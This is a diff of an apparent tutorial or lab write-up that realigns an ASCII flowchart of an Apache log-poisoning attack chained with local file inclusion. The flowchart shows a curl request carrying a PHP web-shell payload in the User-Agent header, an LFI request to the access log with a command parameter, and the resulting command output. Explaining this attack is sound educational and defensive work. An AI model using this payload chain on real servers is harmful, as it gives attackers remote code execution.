@@ -154,28 +154,28 @@ let me summarize the entire attack workflow with a flowchart which DeepSeek made
 
 ```bash
 ┌─────────────────────────────────────────────────────────────┐
-│                    YOUR ACTION (Attacker)                    │
+│                    YOUR ACTION (Attacker)                   │
 ├─────────────────────────────────────────────────────────────┤
 │ curl -A "<?php system($_GET['cmd']); ?>" http://target/     │
 └──────────────────────────────┬──────────────────────────────┘
                                │
                                ▼
 ┌─────────────────────────────────────────────────────────────┐
-│                    APACHE LOG ENTRY                          │
+│                    APACHE LOG ENTRY                         │
 ├─────────────────────────────────────────────────────────────┤
-│ ... "GET / HTTP/1.1" 200 X "-" "<?php system($_GET['cmd']); ?>" │
+│  "GET / HTTP/1.1" 200 X "-" "<?php system($_GET['cmd']); ?>"│
 └──────────────────────────────┬──────────────────────────────┘
                                │ (Log file saved with PHP code)
                                ▼
 ┌─────────────────────────────────────────────────────────────┐
-│                    LFI VULNERABILITY                         │
+│                    LFI VULNERABILITY                        │
 ├─────────────────────────────────────────────────────────────┤
 │ test.php?view=/var/log/apache2/access.log&cmd=id            │
 └──────────────────────────────┬──────────────────────────────┘
                                │
                                ▼
 ┌─────────────────────────────────────────────────────────────┐
-│                    PHP INTERPRETATION                        │
+│                    PHP INTERPRETATION                       │
 ├─────────────────────────────────────────────────────────────┤
 │ 1. include('/var/log/apache2/access.log')                   │
 │ 2. File contains: <?php system($_GET['cmd']); ?>            │
@@ -186,7 +186,7 @@ let me summarize the entire attack workflow with a flowchart which DeepSeek made
 ┌─────────────────────────────────────────────────────────────┐
 │                    RESULT                                   │
 ├─────────────────────────────────────────────────────────────┤
-│ Output: uid=33(www-data) gid=33(www-data) groups=33(www-data) │
+│Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)│
 └─────────────────────────────────────────────────────────────┘
 ```
 
